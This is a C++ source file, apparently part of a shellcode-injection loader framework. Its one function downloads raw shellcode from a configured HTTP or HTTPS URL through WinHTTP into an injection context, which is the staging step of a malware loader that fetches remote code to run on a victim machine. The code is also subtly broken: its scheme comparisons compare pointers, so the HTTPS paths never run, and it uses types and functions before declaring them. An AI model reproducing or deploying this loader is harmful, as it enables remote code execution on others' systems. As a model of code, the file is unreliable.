#include "phases/shellcode/fetch_http.h"
#include "config.h"
#include "debug.h"
#include <cstdio>
#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <stdexcept>

BOOL GetShellcode_Http(INJECT_CTX* ctx) {
    UrlParts shellcodeUrl;
    if (ParseUrl(SHELLCODE_HTTP_URL, shellcodeUrl)) {
        ctx->shellcode = download(shellcodeUrl);
        ctx->shellcodeSize = ctx->shellcode.size();
        DBG("Fetched %d shellcode bytes.", ctx->shellcodeSize);
        return !ctx->shellcode.empty();
    }
    else {
        DBG("Invalid shellcode URL: %s", SHELLCODE_HTTP_URL);
        return FALSE;
    }
}


struct UrlParts {
    wchar_t scheme[16];
    wchar_t host[256];
    wchar_t path[256];
};

bool ParseUrl(LPCWSTR url, UrlParts& out) {
    memset(&out, 0, sizeof(out));
    if (swscanf(url, L"%[^:]://%[^/]/%[^?]", out.scheme, out.host, out.path) < 2)
        return false;
    return true;
}

std::vector<BYTE> download(UrlParts shellcodeUrl) {
    if (shellcodeUrl.scheme != L"https\0" && shellcodeUrl.scheme != L"http\0") {
        DBG("Unrecognized scheme.");
    }


    // initialise session
    HINTERNET hSession;
    if (shellcodeUrl.scheme == L"https\0") {
        hSession = WinHttpOpen(
            NULL,
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
    }
    else {
        hSession = WinHttpOpen(
            NULL,
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);
    }

    // create session for target
    HINTERNET hConnect;
    if (shellcodeUrl.scheme == L"https\0") {
        hConnect = WinHttpConnect(
            hSession,
            shellcodeUrl.host,
            INTERNET_DEFAULT_HTTPS_PORT,            // port 443
            0);
    }
    else {
        hConnect = WinHttpConnect(
            hSession,
            shellcodeUrl.host,
            INTERNET_DEFAULT_HTTP_PORT,            // port 80
            0);
    }

    // create request handle
    HINTERNET hRequest;
    if (shellcodeUrl.scheme == L"https\0") {
        hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            shellcodeUrl.path,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);                   // ssl
    }
    else {
        hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            shellcodeUrl.path,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);                   // ssl
    }

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}